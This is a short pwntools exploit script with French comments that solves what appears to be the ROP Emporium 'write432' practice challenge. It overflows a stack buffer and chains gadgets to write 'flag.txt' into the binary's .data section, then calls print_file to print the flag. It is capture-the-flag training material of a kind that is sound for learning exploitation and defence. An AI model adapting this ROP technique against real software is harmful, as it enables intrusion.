#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+177
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('write432')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

usefulFunction=elf.symbols['usefulFunction']
print_file=usefulFunction+14

g_popedi_ebp=0x080485aa

# 0x08048543 : mov dword ptr [edi], ebp ; ret
g_write = 0x08048543

# data=0x0804a018
data = elf.get_section_by_name('.data').header['sh_addr']

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(g_popedi_ebp)
PL+=p32(data)
PL+=b'flag'
PL+=p32(g_write)

PL+=p32(g_popedi_ebp)
PL+=p32(data+4)
PL+=b'.txt'
PL+=p32(g_write)

PL+=p32(g_popedi_ebp)
PL+=p32(data+8)
PL+=p32(0)
PL+=p32(g_write)

PL+=p32(print_file)
PL+=p32(data)


# affichage du prinf correspondant pour mise au point
print("")
print(f"printf %{offset}s"+''.join([ f"\\x{c:02x}" for c in PL[offset:]])+" A")
print("")

io.sendline(PL)
io.interactive()

